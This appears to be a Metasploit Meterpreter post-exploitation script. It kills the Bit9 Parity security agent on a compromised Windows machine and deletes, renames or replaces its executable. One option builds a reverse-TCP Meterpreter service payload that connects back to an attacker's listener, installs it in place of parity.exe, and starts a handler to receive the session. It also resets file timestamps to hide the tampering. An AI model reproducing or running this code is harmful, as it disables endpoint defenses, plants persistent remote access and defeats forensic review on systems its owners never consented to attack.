#
# Meterpreter script that kills Bit9 Parity process
# and deletes, renames, or replaces parity.exe
#

#
# Options
#
opts = Rex::Parser::Arguments.new(
        "-h"  => [ false, "This help menu"],
	"-rm"  => [ false, "Remove (delete) the target's parity.exe"],
	"-m"  => [ true, "Move (rename) the target's parity.exe as <opt>"],
	"-d"  => [ false, "Download the target's parity.exe to use as a payload template"],
	"-t"  => [ true, "(Overrides -d) Use <opt> as payload exe template default->data/templates/service.exe"],
	"-x"  => [ true, "eXchange (replace) the target's parity.exe with <opt> already on target"],
	"-u"  => [ true, "Upload an executable (service) version of payload <opt> to replace parity.exe"],
        "-r"  => [ true, "Use with -u: The IP of the Metasploit listener for the connect back"],
        "-p"  => [ true, "Use with -u: The port of the Metasploit listener for the connect back"]
)

#
# Default parameters
#
delete = false
backup = false
backupfile = "parity.bkp.exe"
replace = false
upload = false
download = false
payload = "windows/meterpreter/reverse_tcp"
rhost = Rex::Socket.source_address("1.2.3.4")
rport = 4444
workingdir = client.fs.file.expand_path("%ProgramFiles%")+"\\Bit9\\Parity Agent\\"
file = "parity.exe"
parity = "#{workingdir}" + "#{file}"
template=nil

#
# Option parsing
#
opts.parse(args) do |opt, idx, val|
        case opt
        when "-h"
                print_line("Bit 9 parity.exe deletion or replacement" + opts.usage)
                print_line("Example: run replaceBit9 -d -m parity.bkp.exe -u windows/meterpreter/reverse_tcp -r 10.1.1.1 -p 443 ")
                print_line("Example: run replaceBit9 -m parity.bkp -x C:\\WINDOWS\\System32\\alg.exe")
                raise Rex::Script::Completed
	when "-rm"
		delete = true
	when "-m"
		backup = true
		backupfile = val || "parity.bkp.exe"
	when "-d"
		download = true
	when "-x"
		replace = true
		dummyfile = val || client.fs.file.expand_path("%SystemRoot%")+"\\System32\\alg.exe"
	when "-u"
		upload = true
		payload = val
        when "-r"
                rhost = val || Rex::Socket.source_address("1.2.3.4")
        when "-p"
                rport = val.to_i || 4444
	when "-t"
		template = val 
        end
end

def setmace(session,file2set,macehash)
	print_status("Resetting MACE attributes on #{file2set}")
	session.priv.fs.set_file_mace(file2set, macehash['Modified'], macehash['Accessed'], macehash['Created'], macehash['Entry Modified'])
end

# Since parity will normally be restarted by the windows service manager in 
#   about 1 second, let's get some stuff done before we kill the process

# TODO: check if running as system, otherwise auto migrate?
# if (not simple.client.auth_user)


# get MACE attributes for actual parity.exe
client.core.use("priv")
print_status("Grabbing the MACE attributes for the original #{file}")
originalMACE=client.priv.fs.get_file_mace(parity)

if download
	# Download parity.exe to use as a template, make sure we can do this b4 parity is stopped
	template = "data/templates/paritytemplate.exe"
	print_status("Downloading #{file}")
	client.fs.file.download_file("#{template}", "#{workingdir}"+"#{file}")
	print_status(" - #{workingdir}"+"#{file} downloaded as #{template}")
end

if upload
	# Build out the exe payload.
	print_status("Generating executable payload using optional template (#{template}) to replace #{file}")
	pay = client.framework.payloads.create("#{payload}")
	pay.datastore['LHOST'] = rhost
	pay.datastore['LPORT'] = rport
	raw  = pay.generate
	exe = Msf::Util::EXE.to_win32pe_service(client.framework, raw, {:servicename => 'Parity Agent', :template => "#{template}"})
	#exe = Msf::Util::EXE.to_win32pe(client.framework, raw, {:template => template})
end

# Change to the working (parity) directory.
print_status("Changing directory to #{workingdir}")
client.fs.dir.chdir("#{workingdir}")

#
# Ok, let's start the killing 
#

# Processes to kill
killees = %W{
	parity.exe
}

client.sys.process.get_processes().each do |x|
	if (killees.index(x['name'].downcase))
		print_status("Killing off #{x['name']}...")
		client.sys.process.kill(x['pid'])
#	else 
#		print_status("#{x['name']} does not appear to running")
	end

end

#
# Backup/Delete/Replace/Upload
#

if backup
	# Create a backup of the original exe.
	print_status("Renaming #{file} as #{backupfile}")
	cmd = "cmd.exe /c rename #{file} #{backupfile}"
	client.sys.process.execute("#{cmd}", nil, {'Hidden' => 'true','UseTokenThread' => true})
	# Set the MACE attributes on backupfile back to the original
	setmace(client, backupfile, originalMACE) 
end

if delete
	print_status("Deleting #{file}")
	"cmd.exe /c del \"#{file}\""
	client.sys.process.execute("#{cmd}" ,nil,{'Hidden' => true,'UseTokenThread' => true})
elsif replace
	print_status("Replacing #{file} with #{dummyfile}")
	cmd = "cmd.exe /c copy /y \"#{dummyfile}\" \"#{file}\""
	print_status("Executing #{cmd}")
	client.sys.process.execute("#{cmd}" ,nil,{'Hidden' => true,'UseTokenThread' => true})
	# Reset MACE attribs
	setmace(client, parity, originalMACE) 
elsif upload
	# Replace the file with our previously created exe
	print_status("Uploading EXE payload as #{parity}")
	fd = client.fs.file.new(parity, "wb")
	fd.write(exe)
	fd.close
	# Reset MACE attributes
	setmace(client, parity, originalMACE)
	print_status("Done, now starting another handler to handle the callback...")
	print_status("You should get a session as soon as the windows service manager starts \"parity\"")

	# Our handler to recieve the callback.
	handler = client.framework.exploits.create("multi/handler")
	handler.datastore['PAYLOAD'] = payload
	handler.datastore['LHOST']   = rhost
	handler.datastore['LPORT']   = rport
	handler.datastore['ExitOnSession'] = false
	handler.exploit_simple(
		'Payload'        => handler.datastore['PAYLOAD'],
		'RunAsJob'       => true
	)
end
